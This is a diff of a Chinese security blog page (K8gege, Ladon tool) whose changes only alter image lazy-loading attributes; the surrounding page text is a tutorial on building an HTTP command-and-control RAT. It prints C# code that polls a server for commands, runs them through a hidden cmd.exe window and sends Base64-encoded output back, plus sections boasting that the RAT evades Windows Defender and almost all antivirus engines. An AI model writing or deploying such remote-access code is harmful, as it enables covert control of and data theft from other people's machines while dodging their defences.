@@ -70,7 +70,7 @@
     https://www.cnblogs.com/skins/CodingLife/images/title-yellow.png)">
     <div class="main-header-box">
         <a class="header-avatar" href="/" title="K8gege">
-            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" data-original="/../images/avatar.png">
+            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" class="lazyload" data-src="/../images/avatar.png">
 			<h3 class="K8tilte">K8哥哥</h3>
         </a>
         <div class="branding">
@@ -214,7 +214,7 @@
 <h4 id="保存txt">保存txt</h4>
 <p><a target="_blank" rel="noopener" href="http://192.168.1.131:800/deb64txt/MTIzMTIzMTIzMTIzMTI=">http://192.168.1.131:800/deb64txt/MTIzMTIzMTIzMTIzMTI=</a><br>
 <a target="_blank" rel="noopener" href="http://192.168.1.131:800/debase64txt/MTIzMTIzMTIzMTIzMTI=">http://192.168.1.131:800/debase64txt/MTIzMTIzMTIzMTIzMTI=</a></p>
-<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/Ladon8.1_web_echo.PNG"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/Ladon/exe/Ladon8.1_web_echo.PNG"></p>
 <h3 id="HTTP-C2原理">HTTP C2原理</h3>
 <p>1.搭建WEB,可Apache、IIS、Tomcat或者自己研发如Ladon、CobaltStrike<br>
 2.通过HTTP协议获取指令、回传结果<br>
@@ -225,7 +225,7 @@
 <p>既然是通过HTTP实现的，那么我们当然是通过HTTP下达指令，我们可以把指令放在cmd.txt中，然后通过HTTP读取TXT内容，这不就是相当于下达指令了吗？读取到CMD后，执行CMD再将结果通过HTTP回传，所以我们可以使用同一个方法，只是下达指令和接收结果是不同URL而已。</p>
 <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">private static string httpget(String url)</span><br><span class="line">{</span><br><span class="line">	HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);</span><br><span class="line">	request.Method = <span class="string">"GET"</span>;</span><br><span class="line">	request.Accept = <span class="string">"*/*"</span>;</span><br><span class="line">	HttpWebResponse response = (HttpWebResponse)request.GetResponse();</span><br><span class="line">	Stream getStream = response.GetResponseStream();</span><br><span class="line">	StreamReader streamreader = new StreamReader(getStream);</span><br><span class="line">	string result = streamreader.ReadToEnd();</span><br><span class="line">	Console.WriteLine(result);</span><br><span class="line">	<span class="built_in">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
 <p>执行CMD通过getstr接收明文结果<br>
-<img alt="使用http访问查看图片" data-original="/k8img/posts/ladonrat/Ladon_rat.PNG"></p>
+<img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/posts/ladonrat/Ladon_rat.PNG"></p>
 <h3 id="执行CMD代码">执行CMD代码</h3>
 <p>接收到的CMD，通过此代码执行命令并获取结果。列目录、文件下载等其它功能同理</p>
 <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">private static string execcmd(string cmd)</span><br><span class="line">{</span><br><span class="line">	Process CmdProcess = new Process();</span><br><span class="line">	CmdProcess.StartInfo.FileName = <span class="string">"cmd.exe"</span>;</span><br><span class="line">	CmdProcess.StartInfo.CreateNoWindow = <span class="literal">true</span>;</span><br><span class="line">	CmdProcess.StartInfo.UseShellExecute = <span class="literal">false</span>;</span><br><span class="line">	CmdProcess.StartInfo.RedirectStandardInput = <span class="literal">true</span>;</span><br><span class="line">	CmdProcess.StartInfo.RedirectStandardOutput = <span class="literal">true</span>;</span><br><span class="line">	CmdProcess.StartInfo.RedirectStandardError = <span class="literal">true</span>;</span><br><span class="line">	CmdProcess.StartInfo.Arguments = <span class="string">"/c "</span> + cmd;</span><br><span class="line">	CmdProcess.Start();</span><br><span class="line">	string result = CmdProcess.StandardOutput.ReadToEnd();</span><br><span class="line">	CmdProcess.WaitForExit();</span><br><span class="line">	CmdProcess.Close();</span><br><span class="line">	<span class="built_in">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
@@ -233,17 +233,17 @@
 <p>由于明文传输不支持多行结果，将会导致很多命令无法通过GET方式取回显，所以我们可通过BASE64回传，既不直接暴露CMD结果，也解决了多行结果无法回显问题。</p>
 <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public static string Base64_encodeUTF8(string str)</span><br><span class="line">{</span><br><span class="line">	<span class="built_in">return</span> Convert.ToBase64String(Encoding.UTF8.GetBytes(str));</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
 <p>BASE64加密的结果传到Ladon后会自动解密，用IIS、Apache等无此功能(省去脚本编写)<br>
-<img alt="使用http访问查看图片" data-original="/k8img/posts/ladonrat/Ladon_rat2.PNG"></p>
+<img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/posts/ladonrat/Ladon_rat2.PNG"></p>
 <h3 id="win10-Defender免杀">win10 Defender免杀</h3>
 <p>测试win10最新版defender轻松免杀<br>
-<img alt="使用http访问查看图片" data-original="/k8img/posts/ladonrat/win10_av.gif"></p>
+<img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/posts/ladonrat/win10_av.gif"></p>
 <h3 id="免杀virscan所有杀软">免杀virscan所有杀软</h3>
-<p><img alt="使用http访问查看图片" data-original="/k8img/posts/ladonrat/bypass_allav.PNG"></p>
+<p><img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/posts/ladonrat/bypass_allav.PNG"></p>
 <p><a target="_blank" rel="noopener" href="https://r.virscan.org/language/zh-cn/report/48315fc6e64f2b5740358607431618e9">https://r.virscan.org/language/zh-cn/report/48315fc6e64f2b5740358607431618e9</a></p>
 <p>显然很多杀软很垃圾的，对于自己写的RAT依旧轻松免杀,所以那些说自己写的没几个人用的非公开马只针对几个杀软认为自己牛B的，其实免杀水平都不怎样。当你写个公开的工具且很多人使用，依旧能免杀才叫牛，不是写一个没几个人用的东西免杀几个月还认为免杀牛逼，忽悠不会写马的菜B认为免杀难的差不多。你免杀别人公开的大量人用的东西当然难，不公开的东西可能并不需要怎么修改都免杀，功能越少越容易做，难个蛋蛋。</p>
 <h3 id="以色列杀软牛B">以色列杀软牛B</h3>
 <p>突然想起还有一个杀软网站，测试后发现被以色列杀软杀了，这种出现HTTP请求和CMD执行的，那些不杀的杀软，至少也要报个可疑才对。居然不报，还是以色列牛逼<br>
-<img alt="使用http访问查看图片" data-original="/k8img/posts/ladonrat/cbereason_kill.PNG"><br>
+<img alt="使用http访问查看图片" class="lazyload" data-src="/k8img/posts/ladonrat/cbereason_kill.PNG"><br>
 <a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/file/400ae8245d431d49f9d73d0c437a09e2e8914c697ab7305bf3e8c28a90ef344c/detection">https://www.virustotal.com/gui/file/400ae8245d431d49f9d73d0c437a09e2e8914c697ab7305bf3e8c28a90ef344c/detection</a></p>
 <h3 id="Python实现C2">Python实现C2</h3>
 <p>使用PY实现就更简单了，我们可直接套用之前CS假上线的代码，稍微修改加上命令执行即可，参考: <a href="http://k8gege.org/p/40523.html">http://k8gege.org/p/40523.html</a></p>
@@ -261,7 +261,7 @@
     
     <div class="reward" ontouchstart="">
     <div class="reward-wrap">
-	<img height="180" width="180" data-original="../images/k8join2.png">
+	<img height="180" width="180" class="lazyload" data-src="../images/k8join2.png">
 
     </div>
     <p class="reward-tip">
